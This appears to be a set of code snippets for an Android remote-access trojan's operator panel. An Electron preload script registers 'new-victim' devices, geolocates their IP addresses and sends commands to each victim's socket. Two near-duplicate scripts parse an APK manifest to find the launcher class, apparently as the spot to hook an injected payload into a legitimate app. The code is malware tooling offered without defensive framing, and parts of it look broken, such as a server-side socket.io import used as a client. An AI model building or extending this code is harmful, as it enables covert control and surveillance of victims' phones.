## Preload.js
```js
const { contextBridge, ipcRenderer } = require('electron');

const io = require('socket.io');

const geoip = require('geoip-lite');

const victimsList = require('./app/assets/js/model/Victim');

contextBridge.exposeInMainWorld('electron', {

  connectToServer: (port) => {

    const socket = io(`http://localhost:${port}`);

    socket.on('connect', () => {

      ipcRenderer.send('SocketIO:Connected');

    });

    socket.on('disconnect', () => {

      ipcRenderer.send('SocketIO:Disconnected');

    });

    socket.on('new-victim', (victim) => {

      const { id, ip, port, manf, model, release } = victim;

      const address = socket.io.engine.transport.socket._socket.address();

      const remoteIp = address.address;

      const remotePort = address.port;

      const geo = geoip.lookup(remoteIp);

      const country = geo ? geo.country.toLowerCase() : null;

      victimsList.addVictim(id, ip, port, country, manf, model, release, remoteIp, remotePort);

      ipcRenderer.send('SocketIO:NewVictim', victim);

    });

    return socket;

  },

  getVictims: () => {

    return victimsList.getVictims();

  },

  deleteVictim: (id) => {

    victimsList.deleteVictim(id);

  },

  sendCommand: (id, command) => {

    const victim = victimsList.getVictim(id);

    victim.socket.emit('command', command);

  },

  getCommands: (id) => {

    const victim = victimsList.getVictim(id);

    return victim.commands;

  },

  deleteCommand: (id, index) => {

    const victim = victimsList.getVictim(id);

    victim.commands.splice(index, 1);

  },

  disconnect: (socket) => {

    socket.disconnect();

  },

});
```

## hookable class extraction
```js
const fs = require('fs');

const xml2js = require('xml2js');

// Read the AndroidManifest.xml file

fs.readFile('path/to/AndroidManifest.xml', (err, data) => {

  if (err) {

    console.error(err);

    return;

  }

  // Parse the XML data using xml2js

  xml2js.parseString(data, (err, result) => {

    if (err) {

      console.error(err);

      return;

    }

    // Extract the name of the main application class from the manifest

    const application = result['manifest']['application'][0];

    let mainApplicationClassName = application && application['$'] && application['$']['android:name'];

    // Extract the class name of the main launcher activity from the manifest

    const activity = application && application['activity'] && application['activity'].find(activity => {

      const intentFilter = activity['intent-filter'];

      if (intentFilter) {

        return intentFilter.some(filter => filter['action'].some(action => action['$']['android:name'] === 'android.intent.action.MAIN') && filter['category'].some(category => category['$']['android:name'] === 'android.intent.category.LAUNCHER'));

      }

      return false;

    });

    let mainActivityClassName;

    if (mainApplicationClassName) {

      // Remove the package name if it's present

      mainApplicationClassName = mainApplicationClassName.split('.').pop();

      if (mainApplicationClassName.startsWith('.')) {

        mainApplicationClassName = mainApplicationClassName.slice(1);

      }

      console.log('Main application class: ' + mainApplicationClassName);

    } else if (activity) {

      mainActivityClassName = activity['$'] && activity['$']['android:name'];

      // Remove the package name if it's present

      mainActivityClassName = mainActivityClassName.split('.').pop();

      if (mainActivityClassName.startsWith('.')) {

        mainActivityClassName = mainActivityClassName.slice(1);

      }

      console.log('Main activity class: ' + mainActivityClassName);

    } else {

      // Extract the class name of the main launcher activity from the manifest

      const activityAlias = application && application['activity-alias'] && application['activity-alias'].find(activityAlias => {

        const intentFilter = activityAlias['intent-filter'];

        if (intentFilter) {

          return intentFilter.some(filter => filter['action'].some(action => action['$']['android:name'] === 'android.intent.action.MAIN') && filter['category'].some(category => category['$']['android:name'] === 'android.intent.category.LAUNCHER'));

        }

        return false;

      });

      if (activityAlias) {

        const targetActivityName = activityAlias['$'] && activityAlias['$']['android:targetActivity'];

        mainActivityClassName = targetActivityName.split('.').pop();

        if (mainActivityClassName.startsWith('.')) {

          mainActivityClassName = mainActivityClassName.slice(1);

        }

        console.log('Main activity class: ' + mainActivityClassName);

      } else {

        console.log('Main application class and main launcher activity not found');

      }

    }

  });

});


```
```js
const fs = require('fs');

const xml2js = require('xml2js');

// Read the AndroidManifest.xml file

fs.readFile('path/to/AndroidManifest.xml', (err, data) => {

  if (err) {

    console.error(err);

    return;

  }

  // Parse the XML data using xml2js

  xml2js.parseString(data, (err, result) => {

    if (err) {

      console.error(err);

      return;

    }

    // Extract the name of the main application class from the manifest

    const application = result['manifest']['application'][0];

    let mainApplicationClassName = application && application['$'] && application['$']['android:name'];

    if (mainApplicationClassName) {

      // Remove the package name if it's present

      mainApplicationClassName = mainApplicationClassName.split('.').pop();

      if (mainApplicationClassName.startsWith('.')) {

        mainApplicationClassName = mainApplicationClassName.slice(1);

      }

      console.log('Main application class: ' + mainApplicationClassName);

    } else {

      // Extract the class name of the main launcher activity from the manifest

      const activity = application && application['activity'] && application['activity'].find(activity => {

        const intentFilter = activity['intent-filter'];

        if (intentFilter) {

          return intentFilter.some(filter => filter['action'].some(action => action['$']['android:name'] === 'android.intent.action.MAIN') && filter['category'].some(category => category['$']['android:name'] === 'android.intent.category.LAUNCHER'));

        }

        return false;

      });

      let mainActivityClassName;

      if (activity) {

        mainActivityClassName = activity['$'] && activity['$']['android:name'];

        // Remove the package name if it's present

        mainActivityClassName = mainActivityClassName.split('.').pop();

        if (mainActivityClassName.startsWith('.')) {

          mainActivityClassName = mainActivityClassName.slice(1);

        }

        console.log('Main activity class: ' + mainActivityClassName);

      } else {

        // Extract the class name of the main launcher activity from the manifest

        const activityAlias = application && application['activity-alias'] && application['activity-alias'].find(activityAlias => {

          const intentFilter = activityAlias['intent-filter'];

          if (intentFilter) {

            return intentFilter.some(filter => filter['action'].some(action => action['$']['android:name'] === 'android.intent.action.MAIN') && filter['category'].some(category => category['$']['android:name'] === 'android.intent.category.LAUNCHER'));

          }

          return false;

        });

        if (activityAlias) {

          const targetActivityName = activityAlias['$'] && activityAlias['$']['android:targetActivity'];

          mainActivityClassName = targetActivityName.split('.').pop();

          if (mainActivityClassName.startsWith('.')) {

            mainActivityClassName = mainActivityClassName.slice(1);

          }

          console.log('Main activity class: ' + mainActivityClassName);

        } else {

          console.log('Main application class and main launcher activity not found');

        }

      }

    }

  });

});


```
